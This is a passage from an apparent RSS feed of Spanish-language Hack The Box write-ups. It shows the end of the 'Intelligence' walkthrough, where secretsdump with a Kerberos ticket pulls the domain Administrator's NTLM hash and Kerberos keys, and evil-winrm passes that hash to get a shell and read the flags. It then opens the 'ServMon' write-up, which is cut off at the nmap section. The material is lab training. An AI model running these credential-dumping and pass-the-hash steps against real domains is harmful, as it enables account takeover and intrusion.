&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;secretsdump&#34;&gt;SecretsDump&lt;/h2&gt;
&lt;p&gt;Luego obtuvimos el hash del usuario Administrator utilizando &lt;code&gt;secretsdump&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/intelligence ‚ùØ &lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;KRB5CCNAME&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Administrator.ccache
 œÄ ~/htb/intelligence ‚ùØ impacket-secretsdump -k -no-pass dc.intelligence.htb -just-dc-user Administrator
Impacket v0.9.23 - Copyright &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; SecureAuth Corporation

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Dumping Domain Credentials &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;domain&lt;span class=&#34;se&#34;&gt;\u&lt;/span&gt;id:rid:lmhash:nthash&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9075113fe16cf74f7c0f9b27e882dad3:::
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:75dcc603f2d2f7ab8bbd4c12c0c54ec804c7535f0f20e6129acc03ae544976d6
Administrator:aes128-cts-hmac-sha1-96:9091f2d145cb1a2ea31b4aca287c16b0
Administrator:des-cbc-md5:2362bc3191f23732
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Cleaning up...
 œÄ ~/htb/intelligence ‚ùØ
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;shell&#34;&gt;Shell&lt;/h2&gt;
&lt;p&gt;Finalmente obtuvimos acceso por WinRM haciendo Pass-the-Hash para obtener nuestra flag &lt;code&gt;root.txt&lt;/code&gt; y &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/intelligence ‚ùØ evil-winrm -i 10.10.10.248 -u Administrator -H 9075113fe16cf74f7c0f9b27e882dad3

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; whoami
intelligence&lt;span class=&#34;se&#34;&gt;\a&lt;/span&gt;dministrator
*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; ../Desktop
*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&amp;gt; dir


    Directory: C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        7/10/2021  11:15 PM             &lt;span class=&#34;m&#34;&gt;34&lt;/span&gt; root.txt


*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&amp;gt; cat root.txt
8ff6dc01a05ae1bb4f5f36cce5290167
*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&amp;gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; ../../Tiffany.Moline/Desktop
*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;iffany.Molina&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&amp;gt; dir


    Directory: C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;iffany.Molina&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        7/10/2021  11:15 PM             &lt;span class=&#34;m&#34;&gt;34&lt;/span&gt; user.txt


*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;iffany.Molina&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&amp;gt; &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; user.txt
075fbb0ca2160f9734fe17358c73b628
*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;iffany.Molina&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/intelligence/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/intelligence/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>dnsscan</category>
            
          
            
              <category>exiftool</category>
            
          
            
              <category>password-spraying</category>
            
          
            
              <category>smb</category>
            
          
            
              <category>crackmapexec</category>
            
          
            
              <category>adidns</category>
            
          
            
              <category>krbrelayx</category>
            
          
            
              <category>responder</category>
            
          
            
              <category>bloodhound</category>
            
          
            
              <category>gmsadumper</category>
            
          
            
              <category>impacket</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
            
              <category>windows</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - ServMon</title>
        <link>https://sckull.github.io/posts/servmon/</link>
        <pubDate>Fri, 14 May 2021 00:00:00 +0000</pubDate>
        
        <atom:modified>Fri, 14 May 2021 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/servmon/</guid>
        <description>ServMon una maquina de HackTheBox, encontramos una vulnerabilidad en NVMS lo que nos permitio obtener un wordlist que utilizamos con CrackMapExec para realizar Password spraying y obtener acceso por SSH.</description>
        <content:encoded>



  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/servmon/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;p&gt;ServMon una maquina de HackTheBox, encontramos una vulnerabilidad en NVMS lo que nos permitio obtener un wordlist que utilizamos con CrackMapExec para realizar Password spraying y obtener acceso por SSH. Finalmente encontramos NSClient lo que nos llevo a realizar un Tunnel con SSH para obtener el puerto localmente y explotar una vulnerabilidad que nos dio acceso privilegiado.&lt;/p&gt;
&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/240&#34;&gt;ServMon&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,AAABAAIAEBAAAAAAIADdAwAAJgAAABgYAAAAACAA9gYAAAMEAACJUE5HDQoaCgAAAA1JSERSAAAAEAAAABAIBgAAAB/z/2EAAAOkSURBVHicXdPvT9R1AAfw9+fz/XwP7g4OOMBD5MeJpEw8x1jZL+0ECrE2lhZupk2gRivK1lY9YE36MdQnrcUcTM0YuHygq+RB5mYirJ5ANS0BYXZA6Jfjjl/3k+/d976fz6cnrQf9Ba9HLwKAwguKEZgA0NLp3V1WbTlmc8haKUSRBEAJ0fQ4hubGZP9Xnw39DADwgmEEgni9YCMjMDeizdZ6yXeyoIy0+ud55uSddSwvGQCAvDwVldU2uIrVWHBW9p09nNOxhCsxrxeMNDVB0bRGW/0H0cu5hazh8rkVLPrD3LOd06JCQkwuMfcQcnycitLSLOXQG/lY0fiNa6fVl/fvvx4jANDxTW13wRb2Tm+XZu7cHlXeOspIcb6EYZoIxE1QKPAvK+gdEFKbz+THPy5i/plUT9fhW+3k9U9q91TWkeuDF0NplZuXyYl2hYbXOBJJiUiSQ4sYsDAgw07hyEjDp19wGYluEIdancadIfN56q5Ci/ZA2LKUNdJ+RNBfxuKYfJiCwSUSKQGDS5icYGLOxK93o2hr5iQeXiXavLC6Pew1ymyoWbi/Lo8dNMnVG3F01AUwvW8RX/aEMPGXgbvTSQx0h6G/uIqug2uYnNLR8FyC3PsjDquD7GW6jk3lLpNUPgJM+Qg2PWXBrlccEOkc506tQLESvNRih6sYcN3kMJME1R5JAksGEklRyLgAyXUAsTjHM3vS8eRehr8XdPz2NcfM7FZUPL0bEfYAkcZxvNekgxgMjApscxNEDYAxBQsxrpYshYW0O0F80zYMXKxGMm8nHj++AyVuCV8oirF+J16o+R4FZZkIhoSMS5UwBYuUJzAs7FaEI2ly/HYEZ7pdsD12FMLlQZqVIegXmNCsCNAduHImF4GFdUSjaYJk2sENDNPgFO9THVS/73fKs5/H5fyfU0hEZ2FVY5BCQXZGDg54yvBufTkMPRvf9uoyniwAs9Pkqk+5QADgo0vP9mSX0DfvDc6ZampGoVsbSPaGV1Hh2Ix9j1bgh6vn8ePoCRBLQtrtbu5p3MKWZ43zJ48Mt5HOTtDR0YaMJ9qM73KL1LrUfBDZ6Yu8qKCYJuKERKEiEJqT4UhUEFqq5JRvxJqWGr7dn3mgqmow8l+mXc4GR32PedriRLPQTasRCkJIHetJExY1CxnOfKg2JZFYFQPXOuiHv8/8FPZ6wcj/O799qqY2dxttVtKVWmnKQkoJCIWfJ8WtFZ/Z1/3+8E0A+BcW/wD4rrKByBWSBwAAAABJRU5ErkJggolQTkcNChoKAAAADUlIRFIAAAAYAAAAGAgGAAAA4Hc9+AAABr1JREFUeJx9lWlslNcVhp/7LbN4xh7PeGNxjA0e1oJTyhL2xWXt4ljgpooKSYkQlVKpUqvKLbQNDW1SqkSRKhG1VKFt6A8qUgWRgAA3MQRIIIEAoaQxW2zHLMbMYs/2zbfc2x8BSkvU8+vo6J73lY6u3kcAGg+WBGh5fMXk2iavtSTmNQfKZBxdVQAoVyTtrHYpl9Devn5evP76Xw+du7P3gJb4n6EC1Dfblo1rXOC2R+tla7iack0DpwCu9fkjww9mCUipyPQzlO4x9lw+Ymzdu/vAx3c0xRcZSIB1P1m2pnaa/UJVI9WFFPSelVw+b3HtRoFs3gEgXGIwclgJjZMD1D2sEYzBwFVu950y23c8d2jH/SZ3DRSgvrf5qz+qm+1uDVWgXzmq6Nyf5tJAktIaj9F1JhVRDSnhZsLlardLIaEzoSbGghVRGucJcklU73u+jb9/5tBv7prcNZDfbV+6Nt5s7wiWoZ/4m8Obb19j9GSXdS1hZk0SRMIeSnlkbYmUOkNZk84zkr/szZDuMfn6olpmPWZiZYS62Gms/9PzHa8AmgB49LEVYye3WccrG1Tl8Z0ubxztZt0aPxu+YaBrFpbjIYBMUXIjY2PqAk1AecjEtUt5aVeRQwccWhfWM3eNSapXJM/v8c3/+6sHL2iAqJ/tbKpupPLSO4qDx/po/76fH6wC18vhOApTaBiahqEJTP3zXhMaqZxLzkvSvlawqtXkzcOfcekdReVoYnXT3U2A0FatXT45OtptLaTgrf1JVrcqvt0ssWwbv6lj6OLen3A8hS3VveP6DA1D10hbWZ5qlTTN8OjYlySfgFiD19L2xNKpWvU4d3WkhtIrpzwCpRnWtwoG8zZnP7E42VXg06SNg0JqkHMkBcdD6grLk1y5ZfNhl8XFboeMk2f9ao2knebqaY+yYZRUTVBtRrhGLhKa4NKFAo8uc4lGNHbuyvHiM4M8LYGYwalpOguaA4SigptJh8ygxcmDNo93eZzOKt4qEfzwt6XMmqEzc7rg43N5Ji4upbRaLtL8pXJsIQPlAZuFM8B24b2jRQpZxcS8Yn6pRnySj0xGks9ICnmJ7SjiEw0WC8GoAmQTiq5zDkoo5s30yGYsilnwhWXc0HQRs/KKGZMUsQgICQuXBPBcRdc0H7UrS2gR8MLmNCcPW+gmLGkL0vJUkA9W+Lh5yGb6FY/xD5t4jiDeoPhSoySfVeiGiBoIJQQQ8CmUAseB+QuDzF0UQNMFuZzkyIEsh/dZhEMRhteNJWFNpL//KOWxFCufCCIl6Erg2mD6YMpYQfZOPBjSEUlfhKqspVP0JBlL4imF36/410cWf95WZNyXhzNmTjO1TTMpH1VNsMyiO1nk9vtFFi3oJFgiKLqKtOdQJgRZS8P0C6w8aaOYE5fL61XVTctHclCi+QSapui7FqTz3Qa8YXPoDj1EydwwJRXl6P4Upp7n0o0V9PT2EPjH+0x5ZIhYpYErFcmMIlXwU1cKQ31c1vIDeqcmFDIUYKDfRyAAvb02W3/u57pvMRVfmU3CCRIt8SGUg2WFSA3WMjDkkQuHOXa4gj9szuB4CsNUpAdMCAXRNMjd1g5riQv6a9lbKhdt1Ll6JcL1PodXt2fpvtBDpUhRdHIE/RYhvw+lQEpBOutyO5NlzIgYa55cTTFVzd6dOYqW5EZPBRVxg8yAKvR/Etit7dp54Gyyx3ijrAZywRgH9+icPWGTyxXI959nsDDIiIoCrqewXY+Q3+SRsSPZ9uRyXmyZgMh040iXd/c7XDwTgFAVkWGQ7tH37X5l2ikDUD0ntF9HRshl1VNENH29gTUbXE4eG6SitIuslyQcrKIuMox542uZ0VBDSLi0/7idUxdfIxBLEp+mM74pglVsYPQcjVS3Gur7QP8V/FLei+t1P126Pt7sbNd9isRpmzG1n9EQL9CXrCUUXEnTyJmcPvFPmqZOxSbF3o7foUU+onqEwa3eIIn+BoZPD6IkXOk0nv7jlo6X78b1f4CzZcnP6me5W4yQ4vqHHgHnNo2NCSqri+iGQSZnk/I0PM/BUzB4O8jNT2OYoRoemmbiWdBzwnj25Y0dm+8S835kKkCt/8WSDbVT3eejo4imb0Liso2by+Izc+imy5Dl4jk+kCGCZWVUx32UD4dUrxq8dtrctP3Zjm1fhMz/gn7rd5Y2Ncz2Nsbqva+FKkVIelDMgltUAJh+gT8MQodcQuXTPcb+vuPGc7t2Hjjz/6B/f0mAb61fPr0m7raFa+RCo0SN1Q0iAJ7LkFsQF7O39CMDF83du7bvP3ln7wGtfwOzTyGGA+ZrwgAAAABJRU5ErkJggg==&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;OS&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Windows&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;20&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;10.10.10.184&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_maker&#34; style=&#34;margin: auto;&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/82600&#34;&gt;del_KZx497Ju&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/82600&#34; class=&#34;img_user_maker&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;a href=&#34;#single__title&#34; class=&#34;button&#34; style=&#34;width: 72px; height: 30px; pointer-events: none;&#34;  data-color=&#34;default&#34; target=&#34;_blank&#34; rel=&#34;noreferrer&#34;&gt;
  &lt;span class=&#34;button__text&#34;&gt;
    Matrix
  &lt;/span&gt;
&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;div class=&#34;box&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-chart&#34; data-lang=&#34;chart&#34;&gt;{
   &amp;quot;type&amp;quot;:&amp;quot;radar&amp;quot;,
   &amp;quot;data&amp;quot;:{
      &amp;quot;labels&amp;quot;:[&amp;quot;Enumeration&amp;quot;,&amp;quot;Real-Life&amp;quot;,&amp;quot;CVE&amp;quot;,&amp;quot;Custom Explotation&amp;quot;,&amp;quot;CTF-Like&amp;quot;],
      &amp;quot;datasets&amp;quot;:[
         {
            &amp;quot;label&amp;quot;:&amp;quot;User Rate&amp;quot;,  &amp;quot;data&amp;quot;:[5, 4.8, 7.4, 2.6, 5.2],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(75, 162, 189,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#4ba2bd&amp;quot;
         },
         { 
            &amp;quot;label&amp;quot;:&amp;quot;Maker Rate&amp;quot;,
            &amp;quot;data&amp;quot;:[0, 0, 0, 0, 0],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(154, 204, 20,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#9acc14&amp;quot;
         }
      ]
   },
    &amp;quot;options&amp;quot;: {&amp;quot;scale&amp;quot;: {&amp;quot;ticks&amp;quot;: {&amp;quot;backdropColor&amp;quot;:&amp;quot;rgba(0,0,0,0)&amp;quot;},
            &amp;quot;angleLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;},
            &amp;quot;gridLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;}
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;nmap&#34;&gt;NMAP&lt;/h1&gt;
&lt;p&gt;Escaneo de puertos con nmap nos muestra multiples puertos abiertos: ftp (21), ss h(22), http (80), smb (139, 445), RPC (135).&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;  1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 71
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 72
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 73
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 74
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 75
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 76
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 77
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 78
